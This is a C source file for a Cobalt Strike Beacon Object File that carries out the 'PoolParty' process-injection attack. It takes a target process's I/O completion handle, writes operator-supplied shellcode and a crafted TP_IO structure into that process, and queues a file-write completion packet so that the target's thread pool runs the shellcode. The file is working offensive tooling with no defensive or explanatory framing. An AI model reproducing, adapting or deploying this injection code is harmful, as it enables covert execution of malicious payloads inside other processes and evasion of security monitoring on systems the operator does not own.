#include <windows.h>
#include "PoolPartyBof.h"

HANDLE m_p_hIoCompletion = NULL;

HANDLE HijackIoCompletionProcessHandle(HANDLE p_hTarget) {
    return HijackProcessHandle((PWSTR)L"IoCompletion\0", p_hTarget, IO_COMPLETION_ALL_ACCESS);
}

HANDLE GetTargetThreadPoolIoCompletionHandle() {
    HANDLE p_hIoCompletion = HijackIoCompletionProcessHandle(m_p_hTargetPid);
    BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Hijacked I/O completion handle from the target process: %x", p_hIoCompletion);
    return p_hIoCompletion;
}

wchar_t generateRandomLetter() {
    return L'A' + MSVCRT$rand() % 26;
}

wchar_t* generateRandomLetters(int length) {
    wchar_t* randomLetters = (wchar_t*)MSVCRT$malloc((length + 1) * sizeof(wchar_t));
    for (int i = 0; i < length; ++i) {
        randomLetters[i] = generateRandomLetter();
    }
    randomLetters[length] = L'\0';
    return randomLetters;
}

#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"

void RemoteTpAlpcInsertionSetupExecution() {
	_NtSetInformationFile ZwSetInformationFile = (_NtSetInformationFile)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile"));
	MSVCRT$srand((unsigned int)MSVCRT$time(NULL));
	wchar_t* POOL_PARTY_FILE_NAME = generateRandomLetters(7);
	HANDLE p_hFile = KERNEL32$CreateFileW(
		POOL_PARTY_FILE_NAME,
		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "Created pool party file: `%ls`", POOL_PARTY_FILE_NAME);

	PFULL_TP_IO pTpIo = (PFULL_TP_IO)KERNEL32$CreateThreadpoolIo(p_hFile, (PTP_WIN32_IO_CALLBACK)(m_ShellcodeAddress), NULL, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "Created TP_IO structure associated with the shellcode");

	/* Not sure why this field is not filled by CreateThreadpoolIo, need to analyze */
	pTpIo->CleanupGroupMember.Callback = m_ShellcodeAddress;

	++pTpIo->PendingIrpCount;
	BeaconPrintf(CALLBACK_OUTPUT, "Started async IO operation within the TP_IO");

	PFULL_TP_IO pRemoteTpIo = (PFULL_TP_IO)(KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	BeaconPrintf(CALLBACK_OUTPUT, "Allocated TP_IO memory in the target process: %p", pRemoteTpIo);
	KERNEL32$WriteProcessMemory(m_p_hTargetPid, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "Written the specially crafted TP_IO structure to the target process");

	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
	FileIoCopmletionInformation.Port = m_p_hIoCompletion;
	FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;
	ZwSetInformationFile(p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
	BeaconPrintf(CALLBACK_OUTPUT, "Associated file `%s` with the IO completion port of the target process worker factory", POOL_PARTY_FILE_NAME);

	const char* Buffer = POOL_PARTY_POEM;
	SIZE_T BufferLength = sizeof(Buffer);
	OVERLAPPED Overlapped = { 0 };
	KERNEL32$WriteFile(p_hFile, Buffer, BufferLength, NULL, &Overlapped);
	BeaconPrintf(CALLBACK_OUTPUT, "Write to file `%s` to queue a packet to the IO completion port of the target process worker factory", POOL_PARTY_FILE_NAME);
}


void HijackHandles() {
	m_p_hIoCompletion = GetTargetThreadPoolIoCompletionHandle();
}

void Inject() {
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Starting PoolParty attack against process id: %d", m_dwTargetPid);
	m_p_hTargetPid = GetTargetProcessHandle();
	if (m_p_hTargetPid == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	Cannot Open Process!");
		return;
	}
	HijackHandles();
	m_ShellcodeAddress = AllocateShellcodeMemory();
	if (m_ShellcodeAddress == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	AllocateShellcodeMemory Failed!");
		return;	
	}
	if (!WriteShellcode()) {
		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	WriteShellcode Failed!");
		return;	
	}
	RemoteTpAlpcInsertionSetupExecution();
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed.");
}

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    m_dwTargetPid = BeaconDataInt(&parser);
    m_cShellcode = BeaconDataExtract(&parser, &m_szShellcodeSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Shellcode Size: %d bytes", m_szShellcodeSize);
    Inject();
}